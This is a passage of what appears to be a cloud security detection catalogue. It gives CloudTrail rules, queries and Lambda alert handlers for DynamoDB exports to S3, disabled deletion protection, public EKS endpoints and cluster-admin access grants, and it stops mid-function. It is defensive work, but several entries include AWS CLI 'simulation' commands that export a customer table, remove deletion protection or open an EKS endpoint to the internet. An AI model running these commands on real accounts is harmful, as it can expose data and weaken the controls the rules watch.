    tags: ["DynamoDB", "Data Exfiltration", "S3"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Scheduled data lake exports", "Backup procedures"],
    rules: {
      sigma: `title: DynamoDB Table Export to S3
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: dynamodb.amazonaws.com
    eventName: ExportTableToPointInTime
  condition: selection
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=ExportTableToPointInTime
| table _time, userIdentity.type, userIdentity.arn, requestParameters.tableArn, requestParameters.s3Bucket, requestParameters.s3BucketOwner, requestParameters.s3Prefix, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.tableArn, requestParameters.s3Bucket, requestParameters.s3BucketOwner, requestParameters.s3Prefix, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'dynamodb.amazonaws.com'
  AND eventName = 'ExportTableToPointInTime'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.tableArn, requestParameters.s3Bucket, requestParameters.s3BucketOwner, requestParameters.s3Prefix, sourceIPAddress
| filter eventName = "ExportTableToPointInTime"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.dynamodb"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["dynamodb.amazonaws.com"], eventName: ["ExportTableToPointInTime"] } }, null, 2),
      lambda: `"""
DynamoDB Table Exported to S3
Trigger: EventBridge rule matching ExportTableToPointInTime.
Use for: Real-time triage of sensitive or unapproved table exports.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "dynamodb.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "ExportTableToPointInTime":
        return {"matched": False}

    return {
        "matched": "requires-destination-allowlist-check",
        "alert": {
            "rule_id": "det-023",
            "title": "DynamoDB Table Exported to S3",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "table_arn": detail.get("requestParameters", {}).get("tableArn"),
            "s3_bucket": detail.get("requestParameters", {}).get("s3Bucket"),
            "s3_prefix": detail.get("requestParameters", {}).get("s3Prefix"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "dynamodb.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.tableArn", "requestParameters.s3Bucket", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "dynamodb.amazonaws.com", eventName: "ExportTableToPointInTime", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { tableArn: "arn:aws:dynamodb:us-east-1:123456789012:table/MyTable", s3Bucket: "export-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who initiated the export and the destination S3 bucket.", "Verify if this was a scheduled data lake or backup.", "Check the S3 bucket for unauthorized access.", "Review export frequency for exfiltration patterns."],
    testingSteps: ["Export a DynamoDB table to S3.", "Verify CloudTrail captures ExportTableToPointInTime.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "A DynamoDB export to S3 creates a durable offline copy of an entire table outside the application's normal access path. The detection becomes especially valuable when paired with destination-bucket allowlisting and table sensitivity.",
      threatContext: {
        attackerBehavior: "An attacker with dynamodb:ExportTableToPointInTime and permission to write to an S3 bucket can export a full or incremental copy of a table without iterating through item reads.",
        realWorldUsage: "Managed export features are commonly favored in cloud abuse because they create large-scale data copies through native control-plane APIs that blend with admin activity.",
        whyItMatters: "This is a high-impact event for sensitive tables because it can move large datasets into S3 with one API call.",
        riskAndImpact: "If a regulated or business-critical table is exported to an unapproved bucket, the organization may lose control over retention, sharing, replication, encryption, and downstream access.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.tableArn", "requestParameters.s3Bucket", "requestParameters.s3BucketOwner", "requestParameters.s3Prefix", "requestParameters.exportType", "requestParameters.exportFormat", "requestParameters.s3SseAlgorithm", "requestParameters.s3SseKmsKeyId", "responseElements.exportDescription.exportArn", "sourceIPAddress", "awsRegion", "eventTime", "errorCode"],
        loggingRequirements: ["CloudTrail management events must be enabled for DynamoDB APIs.", "Maintain an allowlist of approved destination buckets, owners, and optional prefixes for analytics or backup workflows.", "Optionally enable S3 data events on high-risk destination buckets to observe follow-on object access after export."],
        limitations: ["The export event shows initiation, not who later read, copied, or shared the generated S3 objects.", "Without bucket allowlists and table sensitivity metadata, the rule will be noisy in data-lake-heavy environments.", "Cross-account and cross-region exports are supported."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail provider; dynamodb.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "API action; ExportTableToPointInTime" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "Primary event timestamp" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor ARN" },
          { rawPath: "requestParameters.tableArn", normalizedPath: "aws.dynamodb.table.arn", notes: "Exported table" },
          { rawPath: "requestParameters.s3Bucket", normalizedPath: "destination.bucket.name", notes: "Primary allowlist and exfiltration field" },
          { rawPath: "requestParameters.s3BucketOwner", normalizedPath: "destination.bucket.account.id", notes: "Critical for cross-account export triage" },
          { rawPath: "requestParameters.s3Prefix", normalizedPath: "destination.bucket.prefix", notes: "Useful for policy and allowlist scoping" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["creation"], action: "ExportTableToPointInTime", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { dynamodb: { table: { arn: "arn:aws:dynamodb:us-east-1:123456789012:table/MyTable" }, export: { destination_bucket: "export-bucket", destination_prefix: "ddb/" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Destination Bucket Allowlist", description: "Adds whether the bucket, owner account, and optional prefix are approved for DynamoDB exports in this environment.", examples: ["approved data lake bucket", "backup bucket owner account", "allowed prefix /ddb-exports/prod/"], falsePositiveReduction: "Suppresses routine exports to sanctioned destinations and highlights non-standard buckets immediately." },
        { dimension: "Table Sensitivity and Ownership", description: "Adds data classification, business owner, regulatory flags, and whether the table contains credentials, PII, or customer records.", examples: ["classification: restricted", "owner: payments team", "contains customer PII"], falsePositiveReduction: "Lets low-risk analytics tables generate informational alerts while sensitive tables trigger high-priority incidents." },
        { dimension: "Identity and Workflow Context", description: "Adds role purpose, expected export cadence, CI/data-engineering association, and whether the actor usually performs table exports.", examples: ["data lake pipeline role", "first-time export by IAM user", "approved ETL change window"], falsePositiveReduction: "Separates expected ETL activity from suspicious one-off exports by unusual principals." },
        { dimension: "Bucket Security Posture", description: "Adds destination bucket policy posture, public exposure checks, replication settings, and whether the bucket lives in another account or Region.", examples: ["bucket public access block disabled", "cross-account owner present", "SSE-KMS missing"], falsePositiveReduction: "Raises fidelity by distinguishing controlled internal exports from destinations that increase exfiltration risk." },
      ],
      logicExplanation: {
        humanReadable: "This detection should start broad by matching every ExportTableToPointInTime event, because the API itself represents creation of an offline S3 copy of table data. The production signal comes from prioritization: exports to non-allowlisted buckets, cross-account bucket owners, unusual prefixes, sensitive tables, or unexpected actors should score much higher than known analytics and backup workflows.",
        conditions: ["eventSource equals dynamodb.amazonaws.com", "eventName equals ExportTableToPointInTime", "escalate when requestParameters.s3Bucket is not allowlisted", "escalate when requestParameters.s3BucketOwner is present and does not match the expected owning account", "escalate when the exported table is classified sensitive or the actor is not part of an approved export workflow"],
        tuningGuidance: "1. Maintain an explicit allowlist of approved bucket names, owning accounts, and prefixes. 2. Join the event to table sensitivity metadata. 3. Allowlist known ETL, backup, and data lake roles by both identity and destination.",
        whenToFire: "Fire on every export for visibility, but send highest-severity alerts when the destination bucket is unapproved, cross-account, weakly governed, or tied to a sensitive table.",
      },
      simulationCommand: "aws dynamodb export-table-to-point-in-time --table-arn arn:aws:dynamodb:us-east-1:123456789012:table/Customers --s3-bucket ddb-export-lab-123456789012 --s3-prefix suspicious/customers/$(date +%Y%m%d-%H%M%S) --export-format DYNAMODB_JSON --s3-sse-algorithm AES256 --region us-east-1",
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium (legitimate analytics, backup, and data lake exports are common in some environments)",
        expectedVolume: "Low to moderate, highly org-dependent",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "CloudWatch Logs Insights", "Splunk", "Datadog", "Panther", "Chronicle", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes for centralized analytics. Real-time: EventBridge or streaming CloudTrail for immediate review of sensitive-table exports.",
        considerations: ["PITR must be enabled on the table or the export will fail.", "Bucket allowlists should include bucket owner and prefix, not just bucket name.", "Add S3-side follow-up telemetry for the destination when the bucket is unapproved or the table is sensitive."],
      },
    },
  },
  {
    id: "det-024",
    title: "DynamoDB Table Deletion Protection Disabled",
    description: "Detects when deletion protection is removed from a DynamoDB table.",
    awsService: "DynamoDB",
    relatedServices: [],
    severity: "Medium",
    tags: ["DynamoDB", "Deletion Protection", "Compliance"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Table lifecycle management in development"],
    rules: {
      sigma: `title: DynamoDB Deletion Protection Disabled
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: dynamodb.amazonaws.com
    eventName: UpdateTable
    requestParameters.deletionProtectionEnabled: false
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=UpdateTable
| where requestParameters.deletionProtectionEnabled="false"
| table _time, userIdentity.type, userIdentity.arn, requestParameters.tableName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.tableName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'dynamodb.amazonaws.com'
  AND eventName = 'UpdateTable'
  AND requestParameters.deletionProtectionEnabled = false
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.tableName, requestParameters.deletionProtectionEnabled, sourceIPAddress
| filter eventSource = "dynamodb.amazonaws.com"
| filter eventName = "UpdateTable"
| filter requestParameters.deletionProtectionEnabled = false
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.dynamodb"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["dynamodb.amazonaws.com"], eventName: ["UpdateTable"] } }, null, 2),
      lambda: `"""
DynamoDB Table Deletion Protection Disabled
Trigger: EventBridge rule matching UpdateTable.
Use for: Real-time alerting on removal of DynamoDB deletion protection.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "dynamodb.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "UpdateTable":
        return {"matched": False}
    if detail.get("requestParameters", {}).get("deletionProtectionEnabled") is not False:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-024",
            "title": "DynamoDB Table Deletion Protection Disabled",
            "severity": "Medium",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "table_name": detail.get("requestParameters", {}).get("tableName"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "dynamodb.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.tableName", "requestParameters.deletionProtectionEnabled", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "dynamodb.amazonaws.com", eventName: "UpdateTable", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { tableName: "MyTable", deletionProtectionEnabled: false }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who disabled deletion protection.", "Verify if this was part of table lifecycle management.", "Assess risk of accidental table deletion.", "Re-enable protection if unauthorized."],
    testingSteps: ["Disable deletion protection on a test DynamoDB table.", "Verify CloudTrail captures UpdateTable.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Disabling DynamoDB deletion protection removes a safety control that blocks destructive table deletion even when an actor already has IAM permission to delete the table.",
      threatContext: {
        attackerBehavior: "An attacker with dynamodb:UpdateTable can disable deletion protection on a table before attempting DeleteTable or other disruptive changes.",
        realWorldUsage: "This pattern aligns with common attacker behavior where safety controls, logging, or retention settings are weakened before destructive or extortion-driven actions.",
        whyItMatters: "Most DynamoDB UpdateTable activity is operationally normal, but requestParameters.deletionProtectionEnabled=false is much rarer and more security-relevant.",
        riskAndImpact: "If this goes undetected, an attacker or mistaken admin can later delete a business-critical table, causing service outage, data loss, and recovery work.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.tableName", "requestParameters.deletionProtectionEnabled", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail must be enabled for DynamoDB management events.", "No CloudTrail data events are required.", "Detection should only fire when requestParameters.deletionProtectionEnabled is explicitly present and false."],
        limitations: ["This does not detect tables that were created without deletion protection.", "It does not prove a subsequent delete occurred; correlate with DeleteTable for higher confidence.", "Infrastructure-as-code workflows may legitimately disable protection in lower environments."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail service source; should equal dynamodb.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "API action; should equal UpdateTable" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing the change" },
          { rawPath: "requestParameters.tableName", normalizedPath: "aws.dynamodb.table.name", notes: "Target DynamoDB table name" },
          { rawPath: "requestParameters.deletionProtectionEnabled", normalizedPath: "aws.dynamodb.deletion_protection_enabled", notes: "Boolean control-state change; alert when false" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "UpdateTable", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { dynamodb: { table: { name: "MyTable", deletion_protection_enabled: false } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Identity Context", description: "Identify whether the actor is a platform admin, break-glass role, CI/CD role, or unexpected workload identity.", examples: ["SSO owner metadata", "IAM role path and team tag", "session issuer ARN"], falsePositiveReduction: "Helps separate approved table admins from unusual actors modifying protection settings." },
        { dimension: "Table Criticality", description: "Add business and data sensitivity context for the affected table.", examples: ["tags: prod, pci, customer-data", "CMDB owner", "application tier"], falsePositiveReduction: "Lets you downgrade low-risk dev tables and escalate production or regulated datasets." },
        { dimension: "Change Provenance", description: "Determine whether the change came from Terraform, CloudFormation, deployment automation, or a manual console/CLI session.", examples: ["userAgent", "principalId containing terraform", "pipeline execution metadata"], falsePositiveReduction: "Known IaC change windows are much less suspicious than ad hoc admin changes." },
        { dimension: "Behavioral Baseline", description: "Compare the actor and table against prior protection-state changes.", examples: ["first time actor touched this table", "rare UpdateTable from this role", "after-hours change"], falsePositiveReduction: "First-seen or off-hours changes by non-owners are stronger signals than routine maintenance." },
      ],
      logicExplanation: {
        humanReadable: "This rule should be concrete, not a generic UpdateTable baseline. The detection should match only when the event is a DynamoDB UpdateTable call and the request explicitly sets deletionProtectionEnabled to false.",
        conditions: ["eventSource equals dynamodb.amazonaws.com", "eventName equals UpdateTable", "requestParameters.deletionProtectionEnabled exists", "requestParameters.deletionProtectionEnabled equals false"],
        tuningGuidance: "1. Allowlist known platform automation that manages table lifecycle in non-production environments. 2. Escalate when the target table carries prod or customer tags. 3. Correlate with DeleteTable, backup deletion, or KMS key changes within a short time window.",
        whenToFire: "Fire on every explicit disablement of DynamoDB deletion protection. In mature environments this should be low volume.",
      },
      simulationCommand: "aws dynamodb update-table --table-name MyTable --no-deletion-protection-enabled",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Low to Medium (mostly legitimate only during table lifecycle or IaC changes)",
        expectedVolume: "Very low in stable environments; usually sporadic and environment-dependent",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena", "CloudWatch Logs Insights", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Real-time is practical with EventBridge on CloudTrail management events; batch SIEM/Athena queries every 5 to 15 minutes also work well.",
        considerations: ["Management events are sufficient.", "A state-change rule is usually more useful than a count-based anomaly here.", "Correlating to later DeleteTable makes triage easier."],
      },
    },
  },

  // --- EKS ---
  {
    id: "det-025",
    title: "EKS Cluster Public Endpoint Enabled",
    description: "Detects when an EKS cluster API server endpoint is made publicly accessible.",
    awsService: "EKS",
    relatedServices: [],
    severity: "High",
    tags: ["EKS", "Kubernetes", "Public Access"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Development clusters with intentional public access"],
    rules: {
      sigma: `title: EKS Public Endpoint Enabled
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: eks.amazonaws.com
    eventName:
      - CreateCluster
      - UpdateClusterConfig
  public_endpoint:
    requestParameters.resourcesVpcConfig.endpointPublicAccess: true
  wide_cidr:
    requestParameters.resourcesVpcConfig.publicAccessCidrs:
      - '0.0.0.0/0'
  condition: selection and (public_endpoint or wide_cidr)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail (eventName=CreateCluster OR eventName=UpdateClusterConfig)
| where requestParameters.resourcesVpcConfig.endpointPublicAccess=true OR like(requestParameters, "%publicAccessCidrs%0.0.0.0/0%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.name, requestParameters.resourcesVpcConfig, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.name, requestParameters.resourcesVpcConfig, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'eks.amazonaws.com'
  AND eventName IN ('CreateCluster', 'UpdateClusterConfig')
  AND (
    requestParameters.resourcesVpcConfig.endpointPublicAccess = true
    OR requestParameters.resourcesVpcConfig.publicAccessCidrs LIKE '%0.0.0.0/0%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.name, requestParameters.resourcesVpcConfig, sourceIPAddress
| filter eventName in ["CreateCluster", "UpdateClusterConfig"]
| filter requestParameters.resourcesVpcConfig.endpointPublicAccess = true or requestParameters.resourcesVpcConfig.publicAccessCidrs like /0\.0\.0\.0\/0/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateCluster", "UpdateClusterConfig"] } }, null, 2),
      lambda: `"""
EKS Cluster Public Endpoint Enabled
Trigger: EventBridge rule matching CreateCluster or UpdateClusterConfig.
Use for: Real-time alerting on EKS control-plane exposure changes.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "eks.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") not in ("CreateCluster", "UpdateClusterConfig"):
        return {"matched": False}

    vpc = detail.get("requestParameters", {}).get("resourcesVpcConfig", {})
    cidrs = str(vpc.get("publicAccessCidrs", ""))
    if vpc.get("endpointPublicAccess") is not True and "0.0.0.0/0" not in cidrs:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-025",
            "title": "EKS Cluster Public Endpoint Enabled",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "cluster_name": detail.get("requestParameters", {}).get("name"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.name", "requestParameters.resourcesVpcConfig", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "UpdateClusterConfig", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { name: "my-cluster", resourcesVpcConfig: { publicAccessCidrs: ["0.0.0.0/0"] } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who enabled public endpoint or expanded publicAccessCidrs.", "Verify if this was for development cluster access.", "Assess exposure of the API server.", "Restrict public access if unauthorized."],
    testingSteps: ["Create or update an EKS cluster with public endpoint (0.0.0.0/0).", "Verify CloudTrail captures CreateCluster or UpdateClusterConfig.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Making the EKS Kubernetes API endpoint publicly reachable expands the cluster's external attack surface.",
      threatContext: {
        attackerBehavior: "An attacker or administrator can create or reconfigure an EKS cluster so the API server is internet reachable by setting resourcesVpcConfig.endpointPublicAccess=true or by broadening publicAccessCidrs.",
        realWorldUsage: "Publicly reachable Kubernetes control planes are a recurring misconfiguration class in cloud security assessments and post-compromise attack paths.",
        whyItMatters: "This is a meaningful exposure-change event, especially when the cluster was previously private-only or restricted to narrow CIDRs.",
        riskAndImpact: "If this goes unnoticed, internet-originated access attempts against the cluster API become possible, and any later identity compromise has a much easier path to exploitation.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.name", "requestParameters.resourcesVpcConfig.endpointPublicAccess", "requestParameters.resourcesVpcConfig.publicAccessCidrs", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail must capture EKS management events.", "Detection should evaluate both CreateCluster and UpdateClusterConfig.", "For widening logic, retain prior cluster endpoint configuration or enrich from DescribeCluster."],
        limitations: ["A CreateCluster request may omit endpointPublicAccess while the service default remains public.", "Detecting CIDR widening accurately requires comparison against prior state.", "Public endpoint exposure is not the same as anonymous access."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "Should equal eks.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Should equal CreateCluster or UpdateClusterConfig" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor who changed endpoint access" },
          { rawPath: "requestParameters.name", normalizedPath: "aws.eks.cluster.name", notes: "Cluster identifier in the request" },
          { rawPath: "requestParameters.resourcesVpcConfig.endpointPublicAccess", normalizedPath: "aws.eks.endpoint_public_access", notes: "Boolean public API exposure flag" },
          { rawPath: "requestParameters.resourcesVpcConfig.publicAccessCidrs", normalizedPath: "aws.eks.public_access_cidrs", notes: "Allowed source CIDRs for the public endpoint" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "UpdateClusterConfig", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { eks: { cluster: { name: "my-cluster", endpoint_public_access: true, public_access_cidrs: ["0.0.0.0/0"] } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Cluster Criticality", description: "Add the sensitivity and operational importance of the cluster.", examples: ["tags: prod, shared-services", "CMDB owner", "business criticality score"], falsePositiveReduction: "Keeps dev/test exposure changes from looking as urgent as production platform changes." },
        { dimension: "Network Exposure Context", description: "Compare the new endpoint settings with prior state and with the cluster's private access posture.", examples: ["previous CIDR set", "private endpoint enabled/disabled"], falsePositiveReduction: "Distinguishes harmless narrowing changes from true internet exposure or widening." },
        { dimension: "Change Provenance", description: "Identify whether the update came from infrastructure automation or an ad hoc operator session.", examples: ["Terraform principal patterns", "userAgent", "deployment window metadata"], falsePositiveReduction: "Known IaC-driven endpoint updates are less suspicious than manual console or CLI changes." },
        { dimension: "Identity Context", description: "Profile the actor authorized to change EKS networking and cluster access settings.", examples: ["platform admin role", "SSO group membership", "session issuer ARN"], falsePositiveReduction: "Endpoint exposure by a non-platform actor is much higher signal than the same change by a trusted cluster admin." },
      ],
      logicExplanation: {
        humanReadable: "This rule should focus on explicit EKS API exposure changes rather than a broad CreateCluster or UpdateClusterConfig baseline. The strongest stateless matches are endpointPublicAccess=true and publicAccessCidrs including 0.0.0.0/0 or another obviously broad CIDR.",
        conditions: ["eventSource equals eks.amazonaws.com", "eventName equals CreateCluster or UpdateClusterConfig", "requestParameters.resourcesVpcConfig.endpointPublicAccess equals true or requestParameters.resourcesVpcConfig.publicAccessCidrs contains 0.0.0.0/0"],
        tuningGuidance: "1. Treat 0.0.0.0/0 as higher severity than a narrow corporate CIDR range. 2. Enrich with prior endpoint state so you can suppress narrowing changes. 3. Downgrade approved dev clusters while keeping prod and shared platform clusters high severity.",
        whenToFire: "Fire on any explicit public endpoint enablement and on clearly broad public CIDR exposure.",
      },
      simulationCommand: "aws eks update-cluster-config --name my-cluster --resources-vpc-config endpointPublicAccess=true,endpointPrivateAccess=true,publicAccessCidrs=0.0.0.0/0",
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium (legitimate dev and migration use cases exist, especially without state comparison)",
        expectedVolume: "Low in mature environments, but can spike during cluster migration or networking changes",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena", "CloudWatch Logs Insights", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Real-time on CloudTrail management events is practical; a scheduled batch rule every 5 to 15 minutes is also sufficient.",
        considerations: ["Use CloudTrail for change detection and DescribeCluster or config snapshots for prior-state comparison.", "This is best treated as an exposure-change rule, not as proof of successful unauthorized Kubernetes access."],
      },
    },
  },
  {
    id: "det-026",
    title: "EKS Broad Access Policy Associated",
    description: "Detects broad EKS access policies associated to principals through access entries, a concrete cluster access-weakening event.",
    awsService: "EKS",
    relatedServices: ["IAM"],
    severity: "Critical",
    tags: ["EKS", "Kubernetes", "Authentication"],
    logSources: ["AWS CloudTrail", "EKS Audit Logs"],
    falsePositives: ["Approved platform administration", "Expected cluster bootstrap or delegated admin workflows"],
    rules: {
      sigma: `title: EKS Broad Access Policy Associated
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: eks.amazonaws.com
    eventName: AssociateAccessPolicy
  broad_policy:
    requestParameters.policyArn|contains:
      - 'AmazonEKSClusterAdminPolicy'
      - 'AmazonEKSAdminPolicy'
  cluster_scope:
    requestParameters.accessScope.type: cluster
  condition: selection and broad_policy and cluster_scope
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com eventName=AssociateAccessPolicy
| where like(requestParameters.policyArn, "%AmazonEKSClusterAdminPolicy%") OR like(requestParameters.policyArn, "%AmazonEKSAdminPolicy%")
| where requestParameters.accessScope.type="cluster"
| table _time, userIdentity.type, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, requestParameters.policyArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, requestParameters.policyArn, requestParameters.accessScope.type, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'eks.amazonaws.com'
  AND eventName = 'AssociateAccessPolicy'
  AND (
    requestParameters.policyArn LIKE '%AmazonEKSClusterAdminPolicy%'
    OR requestParameters.policyArn LIKE '%AmazonEKSAdminPolicy%'
  )
  AND requestParameters.accessScope.type = 'cluster'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, requestParameters.policyArn, requestParameters.accessScope.type, sourceIPAddress
| filter eventSource = "eks.amazonaws.com"
| filter eventName = "AssociateAccessPolicy"
| filter requestParameters.policyArn like /AmazonEKSClusterAdminPolicy|AmazonEKSAdminPolicy/
| filter requestParameters.accessScope.type = "cluster"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["AssociateAccessPolicy"] } }, null, 2),
      lambda: `"""
EKS Broad Access Policy Associated
Trigger: EventBridge rule matching AssociateAccessPolicy.
Use for: Real-time alerting on broad EKS authorization grants.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "eks.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "AssociateAccessPolicy":
        return {"matched": False}

    request = detail.get("requestParameters", {})
    policy_arn = request.get("policyArn", "")
    access_scope = request.get("accessScope", {}).get("type")
    if access_scope != "cluster":
        return {"matched": False}
    if "AmazonEKSClusterAdminPolicy" not in policy_arn and "AmazonEKSAdminPolicy" not in policy_arn:
        return {"matched": False}

